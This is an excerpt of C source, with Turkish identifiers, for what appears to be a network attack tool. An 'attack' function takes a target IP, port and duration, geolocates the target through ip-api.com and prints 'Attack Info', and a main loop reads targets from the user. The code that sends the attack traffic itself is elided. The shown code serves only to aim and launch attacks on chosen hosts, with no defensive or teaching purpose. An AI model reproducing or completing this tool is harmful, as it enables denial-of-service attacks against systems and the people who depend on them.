...
void ip_sorgula(char *ip, char *org, char *sehir, char *ulke) {
    ...
    if (sock < 0) {
        strcpy(org, "Bilinmiyor"); strcpy(sehir, "Bilinmiyor"); strcpy(ulke, "Bilinmiyor");
        return;
    }
    struct hostent *sunucu = gethostbyname("ip-api.com");
    if (!sunucu) { close(sock); strcpy(org, "Bilinmiyor"); strcpy(sehir, "Bilinmiyor"); strcpy(ulke, "Bilinmiyor"); return; }
    ...
    if (connect(sock, (struct sockaddr *)&adres, sizeof(adres)) < 0) {
        close(sock); strcpy(org, "Bilinmiyor"); strcpy(sehir, "Bilinmiyor"); strcpy(ulke, "Bilinmiyor");
        return;
    }
    char istek[256];
    snprintf(istek, sizeof(istek), "GET /json/%s HTTP/1.1\r\nHost: ip-api.com\r\nConnection: close\r\n\r\n", ip);
    send(sock, istek, strlen(istek), 0);
    char cevap[4096] = {0};
    int toplam = 0, n;
    while ((n = recv(sock, cevap + toplam, sizeof(cevap) - toplam - 1, 0)) > 0) toplam += n;
    close(sock);
    cevap[toplam] = 0;
    char *json = strstr(cevap, "\r\n\r\n");
    if (json) json += 4; else json = cevap;
    ...
    if (org_ptr) {
        ...
        if (org_ptr) {
            org_ptr++; while (*org_ptr == ' ' || *org_ptr == '"') org_ptr++;
            char *end = strchr(org_ptr, '"');
            if (end) { int len = end - org_ptr; if (len > 0 && len < 100) { strncpy(org, org_ptr, len); org[len] = 0; } }
        }
    }
    if (city_ptr) {
        city_ptr = strchr(city_ptr, ':');
        if (city_ptr) {
            city_ptr++; while (*city_ptr == ' ' || *city_ptr == '"') city_ptr++;
            char *end = strchr(city_ptr, '"');
            if (end) { int len = end - city_ptr; if (len > 0 && len < 100) { strncpy(sehir, city_ptr, len); sehir[len] = 0; } }
        }
    }
    if (country_ptr) {
        country_ptr = strchr(country_ptr, ':');
        if (country_ptr) {
            country_ptr++; while (*country_ptr == ' ' || *country_ptr == '"') country_ptr++;
            char *end = strchr(country_ptr, '"');
            if (end) { int len = end - country_ptr; if (len > 0 && len < 100) { strncpy(ulke, country_ptr, len); ulke[len] = 0; } }
        }
    }
...
void saldir(char *ip, int p, int sn) {
    ...
    char org[128] = {0}, sehir[128] = {0}, ulke[128] = {0};
    printf("[+] IP sorgulaniyor: %s\n", ip);
    ip_sorgula(ip, org, sehir, ulke);
    printf("[+] Sorgu tamamlandi.\n\n");
    
    // DUZ METIN, RENK YOK (sadece prompt renkli)
    printf(" Attack Info \n");
...
int main() {
    ...
    while (1) {
        ...
        if (sscanf(girdi, "%15s %d %d", ip, &p, &sn) == 3) {
            if (p > 0 && p < 65536 && sn > 0) saldir(ip, p, sn);
            else printf("[-] Gecersiz. Ornek: 8.8.8.8 53 60\n");
        } else {
